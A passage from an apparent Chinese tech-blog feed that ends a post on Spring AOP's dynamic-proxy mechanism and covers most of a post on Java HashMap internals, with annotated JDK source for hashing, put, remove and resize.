/></p><p>对于如图4所示的软件系统，如果需要修改深色部分的代码，只要修改一个地方即可，不管整个系统中有多少方法调用了该方法，程序无须修改这些地方，只需要修改被调用的方法即可——通过这种方式，大大降低了软件后期维护的复杂度。</p><p>对于如图4所示的方法1、方法2、方法3依然需要显式调用深色方法，这样做能够解决大部分应用场景。但对于一些更特殊的情况：应用需要方法1、方法2、方法3彻底与深色方法分离——方法1、方法2、方法3无须直接调用深色方法，该如何解决？</p><p>因为软件系统需求变更是非常频繁的事情，系统前期设计方法1、方法2、方法3时只实现了核心业务功能，过了一段时间，我们需要为方法1、方法2、方法3都增加事务控制；又过了一段时间，客户提出方法1、方法2、方法3需要进行用户合法性验证。只有合法的用户才能执行这些方法。因此，我们希望有一种特殊的方法：我们只要定义该方法，无须在方法1、方法2、方法3中显式调用它，系统会“自动”执行该特殊方法。</p><p>实现上述需求的技术就是AOP。AOP专门用于处理系统中分布于各个模块（不同方法）中交叉关注点的问题，在JavaEE应用中，常常通过AOP来处理一些具有横切性质的系统级服务，如事务管理、安全检查、缓存、对象池管理等，AOP已经成为一种非常常用的解决方案。</p><h3 id="spring-aop原理剖析"><a class="markdownIt-Anchor" href="#spring-aop原理剖析"></a> Spring AOP原理剖析</h3><p>Spring AOP框架对AOP代理类的处理原则是：如果目标对象的实现类实现了接口，Spring AOP将会采用JDK动态代理来生成AOP代理类；如果目标对象的实现类没有实现接口，Spring AOP将会采用CGLIB来生成AOP代理类——不过这个选择过程对开发者完全透明、开发者无须关心。</p><p>AOP代理其实是由AOP框架动态生成的一个对象，该对象可作为目标对象使用。AOP代理包含了目标对象的全部方法，但AOP代理中的方法与目标对象的方法存在差异：AOP方法在特定切入点添加了增强处理，并回调了目标对象的方法。</p><p>AOP代理所包含的方法与目标对象的方法示意图如图5所示。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-33be778218ec316b.gif" alt="图5. AOP代理的方法与目标对象的方法" /></p><p>Spring的AOP代理有Spring的IoC容器负责生成、管理，其依赖关系也有IoC容器负责管理。因此，AOP代理可以直接使用容器中的其他Bean实例作为目标，这种关系可由IoC容器的依赖注入提供。</p><p>纵观AOP编程，其中需要程序员参与的只有3个部分：</p><ul><li>定义普通业务组件</li><li>定义切入点，一个切入点可能横切多个业务组件</li><li>定义增强处理，增强处理就是在AOP框架为普通业务组件织入的处理动作</li></ul><p>上面3个部分的第一个部分是最平常不过的事情，无须额外说明。那么进行AOP编程的关键就是定义切入点和定义增强处理。一但定义了合适的切入点和增强处理，AOP框架将会自动生成AOP代理，而AOP代理的方法大致有如下公式：</p><p><strong>代理对象的方法 = 增强处理 + 被代理对象的方法</strong></p><p>Spring AOP的实现原理：AOP框架负责动态生成AOP代理类，这个代理类的方法则由Advice和回调方法对象的方法所组成。</p><p>对于前面提到的图4所示的软件调用结构：当方法1、方法2、方法3…都需要去调用某个具有“横切”性质的方法时，传统的做法是程序员去手动修改方法1、方法2、方法3…通过代码来调用这个具有“横切”性质的方法，但这种做法的可扩展性不好，因为每次都要修改代码。</p><p>于是AOP框架出现，AOP框架则可以“动态的”生成一个新的代理类，而这个代理类所包含的方法1、方法2、方法3的代码，程序员只要定义切入点即可——AOP框架所生成的AOP代理类中包含了新的方法1、方法2、方法3，而AOP框架会根据切入点来决定是否要在方法1、方法2、方法3中回调具有“横切”性质的方法。</p><p>简而言之：AOP原理的奥妙就在于动态地生成了代理类，这个代理类实现了图2的调用——这种调用无须程序员修改代码。</p><h3 id="参考资料-2"><a class="markdownIt-Anchor" href="#参考资料-2"></a> 参考资料</h3><ul><li>《轻量级JavaEE企业应用实战》（第4版）李刚 编著</li><li>《疯狂Java讲义》李刚 编著</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> Spring </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HashMap实现原理</title>
      <link href="/hashMap/"/>
      <url>/hashMap/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>关注点</th><th>结论</th></tr></thead><tbody><tr><td>是否允许空</td><td>key和value都运行空</td></tr><tr><td>是否允许重复元素</td><td>key重复会覆盖，value允许重复</td></tr><tr><td>是否有序</td><td>无序</td></tr><tr><td>是否线程安全</td><td>非线程安全</td></tr></tbody></table><h2 id="hashmap的数据结构"><a class="markdownIt-Anchor" href="#hashmap的数据结构"></a> HashMap的数据结构</h2><p>在Java语言中，最基本的两种结构就是数组和模拟指针（引用），所有的数据结构都可以使用这两个基本结构来构造。HashMap实际就是一个&quot;链表散列&quot;的数据结构，即数组与链表的结合体。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-fda48f04c751b2e9.jpg" alt="" /></p><p>从上图可以看出，HashMap底层就是一个数组结构，数组中的每一项又是一个链表。当新建一个HashMap的时候，就会初始化一个数组。</p><p>首先看一下HashMap的一个存储单元Node：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> hash;</span><br><span class="line">        <span class="keyword">final</span> K key;</span><br><span class="line">        V value;</span><br><span class="line">        Node&lt;K,V&gt; next;</span><br><span class="line"></span><br><span class="line">        Node(<span class="keyword">int</span> hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class="line">            <span class="keyword">this</span>.hash = hash;</span><br><span class="line">            <span class="keyword">this</span>.key = key;</span><br><span class="line">            <span class="keyword">this</span>.value = value;</span><br><span class="line">            <span class="keyword">this</span>.next = next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> K <span class="title">getKey</span><span class="params">()</span>        </span>&#123; <span class="keyword">return</span> key; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> V <span class="title">getValue</span><span class="params">()</span>      </span>&#123; <span class="keyword">return</span> value; &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> key + <span class="string">"="</span> + value; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> V <span class="title">setValue</span><span class="params">(V newValue)</span> </span>&#123;</span><br><span class="line">            V oldValue = value;</span><br><span class="line">            value = newValue;</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Map.Entry) &#123;</span><br><span class="line">                Map.Entry&lt;?,?&gt; e = (Map.Entry&lt;?,?&gt;)o;</span><br><span class="line">                <span class="keyword">if</span> (Objects.equals(key, e.getKey()) &amp;&amp;</span><br><span class="line">                    Objects.equals(value, e.getValue()))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>有上面代码可以看出，Node就是数组中的元素，每个Map.Entry其实就是一个Key-value对，它持有一个指向下一个元素的引用，这就构成了链表。</p><h2 id="功能实现-方法"><a class="markdownIt-Anchor" href="#功能实现-方法"></a> 功能实现-方法</h2><h3 id="确定哈希桶数组索引位置"><a class="markdownIt-Anchor" href="#确定哈希桶数组索引位置"></a> 确定哈希桶数组索引位置</h3><p>不管增加、删除、查找键值对，定位到哈希桶数组的位置都是关键的一步，而定位数组索引的主要方法如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jdk1.8 &amp; jdk1.7</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="comment">// 第一步：h = key.hashCode() 取hashCode值</span></span><br><span class="line">    <span class="comment">// 第二步：h ^ (h &gt;&gt;&gt; 16)     高位参与运算</span></span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// jdk1.7的源码，jdk1.8没有这个方法，但是实现原理一样的</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">indexFor</span><span class="params">(<span class="keyword">int</span> h, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">     <span class="comment">// 第三步: 取模运算</span></span><br><span class="line">     <span class="keyword">return</span> h &amp; (length-<span class="number">1</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里Hash算法本质上就是三步：取key的hashCode值、高位运算、取模运算</p><p>对于任意给定的对象，只要它的hashCode()值相同，那么调用hash()方法中所计算得到的hash码总是相同的。我们首先想到就是把hash值对数组长度求模，这样就保证了元素的分布相对比较均匀。但是，求模运算时间耗费较大，所以采用了indexFor()方法来计算该对象应该保存在table数组中的哪个索引处。</p><p>这个方法非常巧妙，它通过h &amp; (table.length - 1)来得到该对象的保存位，而HashMap底层数组的长度总是2的n次方，这是HashMap在速度上的优化。当length总是2的n次方时，h &amp; (length - 1)运算等价于对length取模，也就是h % length，但是&amp;比%具有更高的效率。</p><p>在JDK1.8的实现中，优化了高位运算的算法，通过hashCode()的高16位异或低16位实现的：(h = k.hashCode()) ^ (h &gt;&gt;&gt; 16)，主要是从速度、功效、质量来考虑的，这么做可以在数组table的length比较小的时候，也能保证考虑到高低Bit都参与到Hash的计算中，同时不会有太大的开销。</p><p>如下图，其中n为table的长度。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-24c0db720e2d499f.png" alt="" /></p><h3 id="添加与修改数据"><a class="markdownIt-Anchor" href="#添加与修改数据"></a> 添加与修改数据</h3><p>由于Java8对hashMap底层进行了优化，当链表长度大于8时，转换为红黑树进行处理，因此以下采用了美团点评技术团队的讲解。</p><p>HashMap的put方法执行过程可以通过下图来理解。</p><p>步骤一：判断键值对数组table[i]是否为空或为null，否则执行resize()进行扩容；</p><p>步骤二：根据键值key计算hash值得到插入的数组索引i，如果table[i]==null，直接新建节点添加，转向⑥，如果table[i]不为空，转向③；</p><p>步骤三：判断table[i]的首个元素是否和key一样，如果相同直接覆盖value，否则转向④，这里的相同指的是hashCode以及equals；</p><p>步骤四：判断table[i] 是否为treeNode，即table[i] 是否是红黑树，如果是红黑树，则直接在树中插入键值对，否则转向⑤；</p><p>步骤五：遍历table[i]，判断链表长度是否大于8，大于8的话把链表转换为红黑树，在红黑树中执行插入操作，否则进行链表的插入操作；遍历过程中若发现key已经存在直接覆盖value即可；</p><p>步骤六：插入成功后，判断实际存在的键值对数量size是否超多了最大容量threshold，如果超过，进行扩容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 对key的hashCode()做hash</span></span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">final</span> V <span class="title">putVal</span><span class="params">(<span class="keyword">int</span> hash, K key, V value, <span class="keyword">boolean</span> onlyIfAbsent, <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, i;</span><br><span class="line">    <span class="comment">// 步骤一：tab为空则创建</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) == <span class="keyword">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    <span class="comment">// 步骤二: 计算index,并对null进行处理 </span></span><br><span class="line">    <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="keyword">null</span>)</span><br><span class="line">        tab[i] = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        <span class="comment">// 步骤三：节点key存在，直接覆盖value</span></span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            e = p;</span><br><span class="line">        <span class="comment">// 步骤四：判断该链为红黑树</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(<span class="keyword">this</span>, tab, hash, key, value);</span><br><span class="line">        <span class="comment">// 步骤五：该链为链表</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> binCount = <span class="number">0</span>; ; ++binCount) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((e = p.next) == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    p.next = newNode(hash, key, value, <span class="keyword">null</span>);</span><br><span class="line">                    <span class="comment">// 链表长度大于8转换为红黑树进行处理</span></span><br><span class="line">                    <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD - <span class="number">1</span>) <span class="comment">// -1 for 1st</span></span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// key已经存在直接覆盖value</span></span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123; <span class="comment">// existing mapping for key</span></span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            <span class="keyword">if</span> (!onlyIfAbsent || oldValue == <span class="keyword">null</span>)</span><br><span class="line">                e.value = value;</span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            <span class="keyword">return</span> oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++modCount;</span><br><span class="line">    <span class="comment">// 步骤六：超过最大容量就扩容</span></span><br><span class="line">    <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="删除数据"><a class="markdownIt-Anchor" href="#删除数据"></a> 删除数据</h3><p>下面是Java8中删除数据源代码的分析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">remove</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt; e;</span><br><span class="line">    <span class="keyword">return</span> (e = removeNode(hash(key), key, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">true</span>)) == <span class="keyword">null</span> ? <span class="keyword">null</span> : e.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title">removeNode</span><span class="params">(<span class="keyword">int</span> hash, Object key, Object value, <span class="keyword">boolean</span> matchValue, <span class="keyword">boolean</span> movable)</span> </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; <span class="keyword">int</span> n, index;</span><br><span class="line">    <span class="comment">// 步骤一：找到要删除数组元素为p</span></span><br><span class="line">    <span class="keyword">if</span> ((tab = table) != <span class="keyword">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (p = tab[index = (n - <span class="number">1</span>) &amp; hash]) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Node&lt;K,V&gt; node = <span class="keyword">null</span>, e; K k; V v;</span><br><span class="line">        <span class="comment">// 步骤二：数组元素p存在，表示要删除的节点node赋为p</span></span><br><span class="line">        <span class="keyword">if</span> (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != <span class="keyword">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            node = p;</span><br><span class="line">        <span class="comment">// 数组元素p是链表，则将链表的下一个节点赋给节点e</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((e = p.next) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 步骤三：如果p为红黑树，则调用方法找到要删除的节点赋给node</span></span><br><span class="line">            <span class="keyword">if</span> (p <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                node = ((TreeNode&lt;K,V&gt;)p).getTreeNode(hash, key);</span><br><span class="line">            <span class="comment">// 步骤四：如果为链表，则找到对应要删除的节点赋给node</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">do</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                        ((k = e.key) == key ||</span><br><span class="line">                            (key != <span class="keyword">null</span> &amp;&amp; key.equals(k)))) &#123;</span><br><span class="line">                        node = e;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    p = e;</span><br><span class="line">                &#125; <span class="keyword">while</span> ((e = e.next) != <span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果找到要删除的节点node</span></span><br><span class="line">        <span class="keyword">if</span> (node != <span class="keyword">null</span> &amp;&amp; (!matchValue || (v = node.value) == value || (value != <span class="keyword">null</span> &amp;&amp; value.equals(v)))) &#123;</span><br><span class="line">            <span class="comment">// 步骤五：判断此时数组元素的类型，并删除对应的节点node</span></span><br><span class="line">            <span class="keyword">if</span> (node <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                ((TreeNode&lt;K,V&gt;)node).removeTreeNode(<span class="keyword">this</span>, tab, movable);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (node == p)</span><br><span class="line">                tab[index] = node.next;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                p.next = node.next;</span><br><span class="line">            ++modCount;</span><br><span class="line">            --size;</span><br><span class="line">            afterNodeRemoval(node);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="hashmap的其他相关讲解"><a class="markdownIt-Anchor" href="#hashmap的其他相关讲解"></a> HashMap的其他相关讲解</h2><h3 id="扩容机制"><a class="markdownIt-Anchor" href="#扩容机制"></a> 扩容机制</h3><p>扩容就是重新计算容量，当HashMap中无法容纳更多的元素时，就要扩大数组的长度，以便容纳更多的元素。由于Java中的数组是无法自动扩容的，所以要使用一个新的数组来代替已有的容量小的数组。</p><p>下面我们分析resize()方法的源码，由于Java8引入了红黑树，因此还采用Java7的源码进行分析。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 传入新的容量</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">int</span> newCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 引用扩容前的Entry数组</span></span><br><span class="line">    Entry[] oldTable = table;</span><br><span class="line">    <span class="keyword">int</span> oldCapacity = oldTable.length;</span><br><span class="line">    <span class="comment">// 扩容前的数组大小如果已经达到最大(2^30)了     </span></span><br><span class="line">    <span class="keyword">if</span> (oldCapacity == MAXIMUM_CAPACITY) &#123;</span><br><span class="line">        <span class="comment">// 修改阈值为int的最大值(2^31-1)，这样以后就不会扩容了</span></span><br><span class="line">        threshold = Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 初始化一个新的Entry数组</span></span><br><span class="line">    Entry[] newTable = <span class="keyword">new</span> Entry[newCapacity];</span><br><span class="line">    <span class="comment">// 将数据转移到新的Entry数组里</span></span><br><span class="line">    transfer(newTable);</span><br><span class="line">    <span class="comment">// HashMap的table属性引用新的Entry数组</span></span><br><span class="line">    table = newTable;</span><br><span class="line">    <span class="comment">// 修改阈值</span></span><br><span class="line">    threshold = (<span class="keyword">int</span>)(newCapacity * loadFactor);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将原有Entry数组的元素拷贝到新的Entry数组里</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transfer</span><span class="params">(Entry[] newTable)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// src引用了旧的Entry数组</span></span><br><span class="line">    Entry[] src = table;                </span><br><span class="line">    <span class="keyword">int</span> newCapacity = newTable.length;</span><br><span class="line">    <span class="comment">// 遍历旧的Entry数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; src.length; j++) &#123;</span><br><span class="line">        <span class="comment">// 取得旧Entry数组的每个元素</span></span><br><span class="line">        Entry&lt;K,V&gt; e = src[j];           </span><br><span class="line">        <span class="keyword">if</span> (e != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 释放旧Entry数组的对象引用（for循环后，旧的Entry数组不再引用任何对象）</span></span><br><span class="line">            src[j] = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                Entry&lt;K,V&gt; next = e.next;</span><br><span class="line">                <span class="comment">// 重新计算每个元素在数组中的位置</span></span><br><span class="line">                <span class="keyword">int</span> i = indexFor(e.hash, newCapacity); </span><br><span class="line">                e.next = newTable[i]; <span class="comment">// 标记[1]</span></span><br><span class="line">                newTable[i] = e;      <span class="comment">// 将元素放在数组上</span></span><br><span class="line">                e = next;             <span class="comment">// 访问下一个Entry链上的元素</span></span><br><span class="line">            &#125; <span class="keyword">while</span> (e != <span class="keyword">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>newTable[i]的引用赋给了e.next，也就是使用了单链表的头插入方式，同一个位置上新元素总会被放在链表的头部位置；这样先放在一个索引的元素最终会放在Entry链的尾部（如果发生了hash冲突），这一点Java8与其不同。由于重新计算了hash值，所以最终可能放在新数组的不同位置。</p><p>下面举个例子简单说明一下扩容的原理。我们采用的hash算法就是key对数组的长度取模。其中哈希桶数组table数组的长度size=2，put的顺序是3、7、5。在mod 2后都在table[1]发生了冲突。这里假设负载因子loadFactor=1，即当键值对实际大小size大于table的实际大小时进行扩容。下面是resize的过程示意图。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/4470227-6988e87b562077bb.png" alt="" /></p><p>Java8中对新数组的索引计算采用了更加简洁的算法，不需要每次去计算hash值；而且在旧链表迁移到新链表的时候，如果新表的数组索引位置相同，则链表元素会倒置，而Java8则不会，详细解析可以见<a href="https://tech.meituan.com/java-hashmap.html" target="_blank" rel="noopener">tech.meituan.com/java-hashmap.html</a></p><h3 id="hashmap的table是transient的"><a class="markdownIt-Anchor" href="#hashmap的table是transient的"></a> HashMap的table是transient的</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> Node&lt;K,V&gt;[] table;</span><br></pre></td></tr></table></figure><p>由于table采用了transient修饰，也就是表示其不可以被序列化，它的原因如下：</p><ul><li>HashMap是基于hashCode的，hashcode作为Object的方法，是native修饰的</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 